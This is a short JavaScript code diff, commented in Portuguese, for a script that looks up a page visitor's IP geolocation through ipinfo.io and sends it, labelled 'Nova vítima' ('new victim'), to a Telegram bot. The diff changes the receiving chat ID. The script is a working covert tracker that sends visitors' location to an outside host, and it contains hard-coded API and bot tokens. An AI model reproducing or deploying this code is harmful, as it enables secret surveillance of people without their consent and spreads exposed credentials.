@@ -9,7 +9,7 @@ fetch("https://ipinfo.io/json?token=c296f01ff5e2f2")
 
     var msg = "🎯 Nova vítima: " + localizacao;
     var telegramToken = "8112207542:AAEJYB0aWtrM5E9jFp2svIs7-ZQ6cImcRWM";
-    var chatId = "74069107115";
+    var chatId = "7306400678";
     var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
 
     fetch(url)
@@ -17,4 +17,5 @@ fetch("https://ipinfo.io/json?token=c296f01ff5e2f2")
     .catch(error => console.error("Erro ao enviar pro Telegram:", error));
 })
 .catch(error => console.error("Erro ao obter localização:", error));
+
 
